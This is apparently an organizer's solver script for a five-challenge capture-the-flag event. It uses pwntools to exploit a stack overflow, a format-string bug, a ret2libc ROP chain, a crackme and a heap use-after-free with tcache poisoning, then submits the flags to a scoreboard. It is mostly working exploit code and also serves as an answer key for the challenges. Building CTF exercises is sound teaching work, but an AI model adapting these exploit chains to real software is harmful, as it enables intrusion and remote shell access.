#!/usr/bin/env python3
"""
Teardown — automated solver / organizer self-check.
Exploits all five pwnables in-network with pwntools, submits each flag to the
scoreboard, and prints the board. Exits 0 iff all five are correct.
"""
import os, re, sys, json, time, urllib.request
from pwn import *

context.update(arch="amd64", os="linux", log_level="error")
BINS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bins")
HOST = {1: ("c1", 9001), 2: ("c2", 9002), 3: ("c3", 9003), 4: ("c4", 9004), 5: ("c5", 9005)}
SB = "http://scoreboard"


def mf(t):
    if isinstance(t, (bytes, bytearray)):
        t = t.decode("latin1", "replace")
    m = re.search(r"TD\{[^}]*\}", t or "")
    return m.group(0) if m else None


def conn(n):
    for _ in range(40):
        try:
            return remote(*HOST[n])
        except Exception:
            time.sleep(2)
    raise RuntimeError("no connect")


# --- C1: ret2win stack overflow (offset 72; ret gadget for stack alignment) ---
def c1():
    e = ELF(f"{BINS}/c1")
    ret = ROP(e).find_gadget(["ret"])[0]
    r = conn(1)
    r.send(b"A" * 72 + p64(ret) + p64(e.sym["win"]))
    data = r.recvall(timeout=4)
    r.close()
    return mf(data)


# --- C2: format string -> set global `authed` = 0xc0ffee -> shell() ----------
def c2():
    e = ELF(f"{BINS}/c2")
    # the format string (buf) lands at direct arg offset 6 on x86-64
    off = 6
    r = conn(2)
    r.recvuntil(b"something:")
    payload = fmtstr_payload(off, {e.sym["authed"]: 0xc0ffee}, write_size="short")
    r.send(payload + b"\n")
    data = r.recvall(timeout=6)
    r.close()
    return mf(data)


# --- C3: ret2libc ROP (leak puts@libc, return to main, system("/bin/sh")) ----
def c3():
    e = ELF(f"{BINS}/c3")
    pop_rdi = next(e.search(b"\x5f\xc3"))     # pop rdi ; ret
    ret = pop_rdi + 1                          # trailing ret (keeps the stack 16-aligned)
    off = 72
    binsh = e.sym["shellcmd"]                  # "/bin/sh" in the binary (no-PIE, fixed)
    system = e.plt["system"]
    r = conn(3)
    r.sendlineafter(b"passphrase?", b"A" * off + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
    time.sleep(0.4)                 # let the shell spawn before feeding it a command
    r.sendline(b"cat /flag")
    data = r.recvrepeat(2.0)        # shell stays open; read for a bit (no EOF)
    r.close()
    return mf(data)


# --- C4: reverse the serial transform, send it, read /flag -------------------
def c4():
    target = bytes.fromhex("2d79233d7d377b4141801b2885184643")
    serial = bytes(((target[i] - 7) & 0xff) ^ (0x41 + i) for i in range(16))
    r = conn(4)
    r.sendafter(b"16 chars):", serial)
    data = r.recvall(timeout=4)
    r.close()
    return mf(data)


# --- C5: heap UAF -> tcache poison -> overwrite fptr `hidden` -> shell --------
def c5():
    e = ELF(f"{BINS}/c5")
    r = conn(5)

    def new(i, s):
        r.sendlineafter(b"6.exit", b"1")
        r.sendlineafter(b"idx:", str(i).encode())
        r.sendlineafter(b"size:", str(s).encode())

    def edit(i, data):
        r.sendlineafter(b"6.exit", b"2")
        r.sendlineafter(b"idx:", str(i).encode())
        r.sendafter(b"data:", data)

    def view(i):
        r.sendlineafter(b"6.exit", b"3")
        r.sendlineafter(b"idx:", str(i).encode())
        return r.recv(8)

    def delete(i):
        r.sendlineafter(b"6.exit", b"4")
        r.sendlineafter(b"idx:", str(i).encode())

    sz = 0x50
    new(0, sz)
    new(1, sz)
    delete(0)                               # chunk0 freed; fd = mangle(NULL) = pos>>12
    key = u64(view(0).ljust(8, b"\x00"))    # UAF read -> safe-linking mangle key
    delete(1)                               # chunk1 freed; tcache head -> chunk1
    edit(1, p64(key ^ e.sym["hidden"]))     # chunk1.fd = mangle(pos, &hidden)
    new(2, sz)                              # returns chunk1
    new(3, sz)                              # returns &hidden (16-aligned -> passes check)
    edit(3, p64(e.sym["shell"]))            # hidden = &shell
    r.sendlineafter(b"6.exit", b"5")        # run -> hidden() -> shell() -> cat /flag
    data = r.recvall(timeout=4)
    r.close()
    return mf(data)


def submit(flag):
    try:
        req = urllib.request.Request(SB + "/submit", data=json.dumps({"flag": flag}).encode(),
                                     headers={"Content-Type": "application/json"})
        return json.loads(urllib.request.urlopen(req, timeout=8).read()).get("correct", False)
    except Exception:
        return False


NAMES = {1: "ret2win overflow", 2: "format string", 3: "ret2libc ROP",
         4: "RE crackme", 5: "heap tcache UAF"}
SOLVERS = {1: c1, 2: c2, 3: c3, 4: c4, 5: c5}
R = {}
for i in range(1, 6):
    R[i] = None
    for _attempt in range(4):            # tolerate flaky emulated connections
        try:
            f = SOLVERS[i]()
            if f:
                R[i] = f
                break
        except Exception:
            pass
        time.sleep(1)

print("== Teardown — solver ==")
all_ok = True
for i in range(1, 6):
    f = R.get(i)
    ok = bool(f) and submit(f)
    all_ok = all_ok and ok
    print(f"  c{i}  {NAMES[i]:<20} {f or '<failed>'}  {'[pwned]' if ok else '[x]'}")
print("\nRESULT:", "ALL 5 FLAGS CAPTURED" if all_ok else "INCOMPLETE")
sys.exit(0 if all_ok else 1)
